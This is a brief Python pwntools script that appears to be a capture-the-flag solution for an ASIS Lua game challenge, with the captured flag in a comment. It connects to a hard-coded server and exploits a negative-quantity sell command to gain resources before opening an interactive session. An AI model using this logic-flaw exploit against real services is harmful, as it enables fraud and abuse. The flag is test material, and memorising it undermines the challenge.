#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "146.185.132.36"
port = 31337
#ASIS{gj_Y0U_oWn3d_ouR_LU4_PWN_task_!}

r = remote(host,port)

def jump(idx):
    r.sendline("g:jump(" + str(idx) +")")

def buy(idx,count):
    r.sendline("g:buy(" + str(idx) + ","  + str(count) + ")")

def buyship(idx):
    r.sendline("g:buyShip(" +str(idx) + ")")

def info():
    r.sendline("g:info()")

def sell(idx,count):
    r.sendline("g:sell(" + str(idx) + "," + str(count)  +")")

r.recvuntil("help")
r.sendline("g = Game.new()")
r.recvuntil("...")
buy(3,99)
jump(1)
jump(2)
sell(3,-1)
sell(3,-1)
buyship(3)
info()
r.interactive()
